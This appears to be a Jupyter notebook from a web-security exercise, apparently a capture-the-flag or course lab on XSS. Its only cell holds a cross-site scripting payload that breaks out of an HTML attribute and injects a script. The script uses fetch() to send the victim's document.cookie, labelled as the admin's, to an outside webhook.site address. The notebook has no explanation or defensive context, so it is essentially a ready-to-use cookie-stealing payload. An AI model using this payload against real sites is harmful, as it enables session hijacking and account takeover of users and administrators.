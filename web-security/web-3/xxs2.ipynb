{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\"><script>fetch('https://webhook.site/0cc67171-c7dc-4706-93df-d653427f627a?admin='+document.cookie)</script>"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
